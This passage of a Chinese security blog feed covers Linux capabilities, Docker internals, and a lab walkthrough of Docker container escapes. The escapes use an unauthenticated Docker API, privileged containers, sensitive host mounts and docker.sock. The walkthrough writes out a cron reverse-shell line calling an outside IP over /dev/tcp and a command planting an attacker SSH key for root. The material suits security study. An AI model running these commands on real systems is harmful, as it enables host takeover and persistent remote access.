bit开启，从而可以将Permitted集合中的Capabilities自动添加到Effective集合中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker3/1.png"></p><h2 id="使用Capabilities"><a href="#使用Capabilities" class="headerlink" title="使用Capabilities"></a>使用Capabilities</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看文件的capabilitiesgetcap <span class="token operator">/</span>bin<span class="token operator">/</span>ping <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker3/2.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">也可以使用<span class="token operator">-</span>r参数来递归查询getcap <span class="token operator">-</span>r <span class="token operator">/</span>usr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker3/3.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">直接查看进程Capabilities，可以如下直接加pidgetpcaps 71431<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h6 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker3/4.png"></h6><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">设置文件的Capabilities，使用setcap添加cap_net_admin到permitted、effective集合中setcap cap_net_admin<span class="token operator">+</span>ep 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker3/5.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">移除文件的Capabilitiessetcap <span class="token operator">-</span>r  2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker3/6.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CloudSecurity </tag>
            
            <tag> Docker </tag>
            
            <tag> Capabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker容器利用思路(一)</title>
      <link href="2022/04/08/docker-rong-qi-li-yong-si-lu-yi/"/>
      <url>2022/04/08/docker-rong-qi-li-yong-si-lu-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">docker常规启动调用链如下：docker client => dockerd => docker<span class="token operator">-</span>containerd => docker<span class="token operator">-</span>containerd<span class="token operator">-</span>shim => runc<span class="token punctuation">(</span>容器外<span class="token punctuation">)</span> => runc <span class="token punctuation">(</span>容器内<span class="token punctuation">)</span> => container<span class="token operator">-</span>entrypoint常规利用关注点：用户侧：不安全的配置服务侧：容器服务自身漏洞系统测：内核漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="不安全的配置"><a href="#不安全的配置" class="headerlink" title="不安全的配置"></a>不安全的配置</h2><h3 id="docker未授权"><a href="#docker未授权" class="headerlink" title="docker未授权"></a>docker未授权</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">利用dockcer api来操作docker执行命令，从而进步获得宿主机权限访问相关端口http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>3<span class="token punctuation">.</span>19:2375<span class="token operator">/</span>version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker2/d1.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">远程连接docker <span class="token operator">-</span>H tcp:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>3<span class="token punctuation">.</span>19:2375 version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker2/d2.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">镜像获取<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker2/d3.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">运行情况获取<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker2/d4.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">进入已经启动的容器内<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker2/d5.png"></p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">运行一个新容器，挂载宿主机目录到mnt<span class="token function">echo</span> <span class="token operator">-</span>e <span class="token string">"* * * * * root bash -i >&amp;  /dev/tcp/192.168.3.1/50401  0>&amp;1\n"</span> >> <span class="token operator">/</span>mnt<span class="token operator">/</span>etc<span class="token operator">/</span>crontab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker2/d6.png"></p><h4 id="写密钥"><a href="#写密钥" class="headerlink" title="写密钥"></a>写密钥</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">echo</span> “ssh<span class="token operator">-</span>rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDaAPKqIqS1r20JOSl<span class="token operator">/</span>TVxFObirhawQZr1NGNEkhV7ZdoKeyaLqNEyweGM<span class="token operator">/</span>QK8zCIK1Wm<span class="token operator">+</span>Py0ZMStBjc0NREQJCMtCkLAHeAzCPr<span class="token operator">/</span>RNfewH4ouZjhNKPUNN6r9aji8<span class="token operator">/</span>2WSLEKn9yma0cSuQa<span class="token operator">+</span>WhnrtMdPze1wupoZFWZVH5P1t5IIQ2RLpbx0<span class="token operator">+</span>8hBZ53hLnSnxDonngcSe<span class="token operator">/</span>XkbMOMgbkPQmu9HL8Lshz7DCK1sbyrTCHktWaz8tEEl2<span class="token operator">/</span>6ykl6eBGnfK<span class="token operator">/</span>E3bSX2slDQkwy2gMXN<span class="token operator">+</span>UXdFNLfHg06Cw7nkm4BaKoHo<span class="token operator">+</span>bujXBjScDuVTwR5r1<span class="token operator">/</span>wF0KF7FyvYHnNOBzq1OoV root@node1” > <span class="token operator">/</span>root<span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker2/d7.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">攻击机密钥连接即可cd <span class="token operator">/</span>root<span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>ssh <span class="token operator">-</span>i id_rsa root@192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>3<span class="token punctuation">.</span>19<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="高危启动参数"><a href="#高危启动参数" class="headerlink" title="高危启动参数"></a>高危启动参数</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">存在一些高危，将会给予容器较大权限，允许执行一些特权操作，在一定的条件下讲导致容器逃逸，比如通过些ssh密钥、计划任务等方式常见参数docker run <span class="token operator">--</span><span class="token function">rm</span> <span class="token operator">-</span>it     <span class="token operator">--</span>privileged     <span class="token operator">-</span>v <span class="token operator">/</span>:<span class="token operator">/</span>soft  <span class="token comment"># 挂载根目录到soft</span>    <span class="token operator">--</span>cap<span class="token operator">-</span>add=SYS_ADMIN  <span class="token comment"># 启动虽然有挂载权限，但没法直接获得资源区挂载，需要其他方法获得资源</span>    <span class="token operator">--</span>net=host  <span class="token comment"># 启动时绕过network namespace</span>    <span class="token operator">--</span>pid=host  <span class="token comment"># 启动时绕过pid namespace  </span>    <span class="token operator">--</span>ipc=host  <span class="token comment"># 启动时绕过ipc namespace </span>    ubuntu     <span class="token operator">/</span>bin<span class="token operator">/</span>bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="privileged利用"><a href="#privileged利用" class="headerlink" title="privileged利用"></a>privileged利用</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">容器启动如下docker run —privileged，容器就能够访问宿主机上所有设备、目录等信息，而K8s是配置文件启用了privileged trueapiVersion: extensions<span class="token operator">/</span>v1beta1kind: Deploymentmetadata:  name: tomcat<span class="token operator">-</span>deployment  labels:    app: tomcatspec:  replicas: 2  selector:    matchLabels:      app: tomcat  template:    metadata:      labels:        app: tomcat    spec:      containers:      <span class="token operator">-</span> name: tomcat        image: tomcat:latest        ports:        <span class="token operator">-</span> containerPort: 8080        securityContext:          privileged: true此处假设以获取webshell、反弹shell进步利用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker2/d8.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看磁盘fdisk <span class="token operator">-</span>l 进步挂载目录mkdir 2022<span class="token function">mount</span> <span class="token operator">/</span>dev<span class="token operator">/</span>sda1 <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>tomcat<span class="token operator">/</span>webapps<span class="token operator">/</span>ROOT<span class="token operator">/</span>2022chroot <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>tomcat<span class="token operator">/</span>webapps<span class="token operator">/</span>ROOT<span class="token operator">/</span>2022  bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker2/d9.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker2/d10.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">docker环境利用，如果使用此参数，容器可以完全访问所有设备，不受linux capabilities的限制docker run <span class="token operator">-</span>it <span class="token operator">--</span>privileged centos   <span class="token operator">/</span>bin<span class="token operator">/</span>bashmkdir <span class="token operator">/</span>tmp<span class="token operator">/</span>ttt<span class="token function">mount</span> <span class="token operator">/</span>dev<span class="token operator">/</span>sda1  <span class="token operator">/</span>tmp<span class="token operator">/</span>tttt 挂载效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker2/d11.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker2/d12.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">进步进入目录写入计划任务等均可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="挂载敏感目录利用"><a href="#挂载敏感目录利用" class="headerlink" title="挂载敏感目录利用"></a>挂载敏感目录利用</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">如下此处将宿主机的root目录挂载到容器的root上，效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker2/d13.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">或者直接挂载<span class="token operator">/</span>  <span class="token operator">-</span>v  <span class="token operator">/</span>:<span class="token operator">/</span>test，反弹shell如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker2/d14.png"></p><h3 id="docker-sock挂载"><a href="#docker-sock挂载" class="headerlink" title="docker.sock挂载"></a>docker.sock挂载</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">docker in docker，在docker容器中调用和执行宿主机的docker，将docker宿主机的docker文件和docker<span class="token punctuation">.</span>sock文件挂载到容器中  发现docker<span class="token punctuation">.</span>sock如下find <span class="token operator">/</span> <span class="token operator">-</span>name docker<span class="token punctuation">.</span>sock  查看宿主机docker信息docker <span class="token operator">-</span>H unix:<span class="token operator">/</span>/<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run<span class="token operator">/</span>docker<span class="token punctuation">.</span>sock info<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker2/d15.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">运行新docker并挂载到宿主机目录上<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker2/d16.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">m1文件为宿主机目录下，后续同理反弹shell即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker2/d17.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CloudSecurity </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker技术与原理实现</title>
      <link href="2022/04/08/docker-ji-zhu-yu-yuan-li-shi-xian/"/>
      <url>2022/04/08/docker-ji-zhu-yu-yuan-li-shi-xian/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">当前的虚拟化技术、云计算等都能想到docker，可以让开发者打包任何应用以及依赖包到容器中，然后发布到任何流行的Linux机器上，完美的解决了测试环境与生产环境的某些不一致性问题。相比于传统的虚拟化技术，docker容器直接使用宿主机内核，也不存在硬件的虚拟，轻便非常多docker为了实现和虚拟机一样的效果，即有独立于宿主机的文件系统，进程系统，内存系统，而采取的设计思想是隔离容器不让它看到主机的文件系统，进程系统，内存系统等等，那么容器就可以理解为一个虚拟机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">命名空间namespace是linux提供的用于分离进程树、网络接口、挂载点及进程间通信等资源的方法，日常使用系统时，并没有运行多个完全分离的服务器，但如果在服务器上启动了多个服务，这些服务将会互相影响，每个服务都能看到其他进程的服务，也能够访问宿主机上的任意文件，这并不是想看的的，希望的是能够实现同一台机器上不同服务能够完全隔离，就像运行在多个不同机器上一样常规情况下，一旦某服务被攻击者入侵，那么攻击者就能获得当前机器上所有的服务和文件，这也不是想看到的，而docker就通过了linux的namespace对不同容器实现了隔离命名空间机制提供了七种不同选项，从而实现能够在创建新的进程时候设置新进程点应该在哪些资源上和宿主机进行隔离：CLONE_NEWCGROUP、CLONE_NEWIPC、CLONE_NEWNET、CLONE_NEWNS、CLONE_NEWPID、CLONE_NEWUSER 和 CLONE_NEWUTS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">表示一个正在执行的程序，可通过<span class="token function">ps</span>命令获取UID          PID    PPID  C STIME TTY          TIME CMDroot           1       0  0 Mar02 ?        00:09:03 <span class="token operator">/</span>sbin<span class="token operator">/</span>init noibrsroot           2       0  0 Mar02 ?        00:00:00 <span class="token namespace">[kthreadd]</span>root           3       2  0 Mar02 ?        00:00:00 <span class="token namespace">[rcu_gp]</span>root           4       2  0 Mar02 ?        00:00:00 <span class="token namespace">[rcu_par_gp]</span>root           6       2  0 Mar02 ?        00:00:00 <span class="token namespace">[kworker/0:0H-kblockd]</span>root           9       2  0 Mar02 ?        00:00:00 <span class="token namespace">[mm_percpu_wq]</span>root          10       2  0 Mar02 ?        00:01:47 <span class="token namespace">[ksoftirqd/0]</span>root          11       2  0 Mar02 ?        01:13:04 <span class="token namespace">[rcu_sched]</span>root          12       2  0 Mar02 ?        00:00:13 <span class="token namespace">[migration/0]</span>root          13       2  0 Mar02 ?        00:00:00 <span class="token namespace">[idle_inject/0]</span>root          14       2  0 Mar02 ?        00:00:00 <span class="token namespace">[cpuhp/0]</span>root          15       2  0 Mar02 ?        00:00:00 <span class="token namespace">[cpuhp/1]</span>root          16       2  0 Mar02 ?        00:00:00 <span class="token namespace">[idle_inject/1]</span>root          17       2  0 Mar02 ?        00:00:13 <span class="token namespace">[migration/1]</span>特殊进程：<span class="token operator">/</span>sbin<span class="token operator">/</span>init、kthreadd，两个都被linux中上帝进程idle创建出来的，前者负责执行内核的一部分初始化和系统配置，也会创建一些类似getty的注册进程，后者负责管理和调度其他内核进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker1/d1.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在创建的docker容器内查看进程，并不涉及到系统层面的启动，所以他的进程数量也少了非常多，可以拿来判断环境是docker还是常规虚拟机的依据<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker1/d2.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">此处就是利用先前提到的进程空间中CLONE_NEWPID实现，容器内的任意进程对宿主机的进程都是一无所知的，当前docker进程创建可理解如下init => dockerd => docker<span class="token operator">-</span>containd => docker<span class="token operator">-</span>containerd<span class="token operator">-</span>shim => <span class="token operator">/</span>bin<span class="token operator">/</span>bash &amp; <span class="token function">ps</span> <span class="token operator">-</span>ef此处容器就是利用上述方法实现与宿主机的进程隔离，在docker run或者docker <span class="token function">start</span>时，会在下面方法中创建一个用于设置进程隔离的specfunc <span class="token punctuation">(</span>daemon <span class="token operator">*</span>Daemon<span class="token punctuation">)</span> createSpec<span class="token punctuation">(</span>c <span class="token operator">*</span>container<span class="token punctuation">.</span>Container<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>specs<span class="token punctuation">.</span>Spec<span class="token punctuation">,</span> error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>s := oci<span class="token punctuation">.</span>DefaultSpec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token operator">/</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">if</span> err := setNamespaces<span class="token punctuation">(</span>daemon<span class="token punctuation">,</span> &amp;s<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!</span>= nil <span class="token punctuation">&#123;</span><span class="token keyword">return</span> nil<span class="token punctuation">,</span> fmt<span class="token punctuation">.</span>Errorf<span class="token punctuation">(</span><span class="token string">"linux spec namespaces: %v"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> &amp;s<span class="token punctuation">,</span> nil<span class="token punctuation">&#125;</span>在setnamespace方法中不仅会设置进程相关的命名空间还会设置用户、网络、ips及uts相关命名空间func setNamespaces<span class="token punctuation">(</span>daemon <span class="token operator">*</span>Daemon<span class="token punctuation">,</span> s <span class="token operator">*</span>specs<span class="token punctuation">.</span>Spec<span class="token punctuation">,</span> c <span class="token operator">*</span>container<span class="token punctuation">.</span>Container<span class="token punctuation">)</span> error <span class="token punctuation">&#123;</span><span class="token operator">/</span><span class="token operator">/</span> user<span class="token operator">/</span><span class="token operator">/</span> network<span class="token operator">/</span><span class="token operator">/</span> ipc<span class="token operator">/</span><span class="token operator">/</span> uts<span class="token operator">/</span><span class="token operator">/</span> pid<span class="token keyword">if</span> c<span class="token punctuation">.</span>HostConfig<span class="token punctuation">.</span>PidMode<span class="token punctuation">.</span>IsContainer<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>ns := specs<span class="token punctuation">.</span>LinuxNamespace<span class="token punctuation">&#123;</span><span class="token function">Type</span>: <span class="token string">"pid"</span><span class="token punctuation">&#125;</span>pc<span class="token punctuation">,</span> err := daemon<span class="token punctuation">.</span>getPidContainer<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!</span>= nil <span class="token punctuation">&#123;</span><span class="token keyword">return</span> err<span class="token punctuation">&#125;</span>ns<span class="token punctuation">.</span>Path = fmt<span class="token punctuation">.</span>Sprintf<span class="token punctuation">(</span><span class="token string">"/proc/%d/ns/pid"</span><span class="token punctuation">,</span> pc<span class="token punctuation">.</span>State<span class="token punctuation">.</span>GetPID<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>setNamespace<span class="token punctuation">(</span>s<span class="token punctuation">,</span> ns<span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>HostConfig<span class="token punctuation">.</span>PidMode<span class="token punctuation">.</span>IsHost<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>oci<span class="token punctuation">.</span>RemoveNamespace<span class="token punctuation">(</span>s<span class="token punctuation">,</span> specs<span class="token punctuation">.</span>LinuxNamespaceType<span class="token punctuation">(</span><span class="token string">"pid"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>ns := specs<span class="token punctuation">.</span>LinuxNamespace<span class="token punctuation">&#123;</span><span class="token function">Type</span>: <span class="token string">"pid"</span><span class="token punctuation">&#125;</span>setNamespace<span class="token punctuation">(</span>s<span class="token punctuation">,</span> ns<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> nil<span class="token punctuation">&#125;</span>所有命名空间相关的设置spec都会作为create函数在创建新容器时候设定daemon<span class="token punctuation">.</span>containerd<span class="token punctuation">.</span>Create<span class="token punctuation">(</span>context<span class="token punctuation">.</span>Background<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> container<span class="token punctuation">.</span>ID<span class="token punctuation">,</span> spec<span class="token punctuation">,</span> createOptions<span class="token punctuation">)</span>综上所述所有命名空间和相关的设置都是在上述两个函数进行创建，也就实现了docker容器通过命名空间创建出来的宿主机进程网络隔离<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">如果docker容器通过linux命名空间完成了与宿主机之间的进程的网络隔离，但却没法通过宿主机的网络和整个互联网连接，所以docker可以通过命名空间创建一个隔离的网络环境，但是docker中服务仍然需要和外接相连才能发挥作用每个docker run启动的容器都具备单独的命名空间，docker此处提供了四种的网络模式，Host、Container、None、Bridge 此处主要以docker默认的桥接模式开展，除了会分配隔离的网络命名空间外，还会为所有的容器设置ip，当docekr容器在主机上启动后会新建虚拟网桥docker0随后该主机所有服务默认都和该网桥连接。每个容器在创建时候都会创建一对虚拟网卡，两个虚拟网卡组成了数据通道，其中一个会放在创建的容器内，会加入到名为docker0的网桥中，如下可查看当前网桥接口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker1/d3.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">docker0会为每个容器分配一个新的ip，并将docker0的ip地址设置为默认网关，网桥docker0通过 iptables中的配置与宿主机器上的网卡相连，所有符合条件的请求都会通过iptables转发到docker0并由网桥分发给对应的机器查看iptables<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker1/d4.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">进步开启redisdocker run <span class="token operator">-</span>d <span class="token operator">-</span>p 6379:6379 redis再次查看iptables中的nat配置则会发现docker的链接中出现了一条新的规则，会将任意发送到当前机器6379的端口的tcp包转发给172<span class="token punctuation">.</span>17<span class="token punctuation">.</span>0<span class="token punctuation">.</span>3的6379上，当前的这个地址就是docker为redis分配的地址，如果从当前的机器直接ping这个地址也是可以通的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker1/d5.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">通过上述现象，可以发现docker是如何对内部端口进行转发的了，当docker容器需要将服务提供给宿主机时，就会为容器分配一个ip地址，同时向iptables中追加一条新的规则，当上面用客户端访问127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1：6379时候，胡本公告iptables的nat将ip定向到了172的地址，重定向过的数据包就可以通过iptables中的<span class="token keyword">filter</span>配置，最终在nat阶段将ip伪装成了127的地址，实际从外面看起来请求的是127的地址却已经是docker容器暴露出来的地址度那块了如此docker通过linux命名空间实现了网络隔离，通过了iptables进行数据包转发，使得docker容器能够为宿主机或者其他容器提供服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="挂载点"><a href="#挂载点" class="headerlink" title="挂载点"></a>挂载点</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">挂载点在不做隔离的情况下，docker容器内依旧可以访问宿主机的所有文件系统，因此在新的进程中创建隔离的挂载点命名空间需要在clone函数中传入CLONE_NEWNS，子进程就能得到父进程挂载点的拷贝，如果不传入这个参数子进程对文件系统的读写都会同步回父进程以及整个主机的文件系统一个容器需要启动，则一定需要提供一个根文件系统rootfs，容器需要使用这个文件系统来创建一个进程，所有二进制的执行都必须在这个根文件系统中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker1/d6.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">想要正常启动一个容器就需要再rootfs中股灾以上几个特定目录，并且还需要简历一些符号链接保障系统io正常运行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker1/d7.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">为了保证容器进程无法访问宿主机上其他目录，还需要通过libcontainer提供的pivot_root或chroot函数改变进程能够访问这个目录的根节点<span class="token operator">/</span><span class="token operator">/</span> pivor_rootput_old = mkdir<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>pivot_root<span class="token punctuation">(</span>rootfs<span class="token punctuation">,</span> put_old<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>unmount<span class="token punctuation">(</span>put_old<span class="token punctuation">,</span> MS_DETACH<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">rmdir</span><span class="token punctuation">(</span>put_old<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">/</span> chroot<span class="token function">mount</span><span class="token punctuation">(</span>rootfs<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> NULL<span class="token punctuation">,</span> MS_MOVE<span class="token punctuation">,</span> NULL<span class="token punctuation">)</span><span class="token punctuation">;</span>chroot<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>此刻就完成了将目录挂载到容器中，同时也禁止容器进程访问宿主机的目录，实现文件系统隔离<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 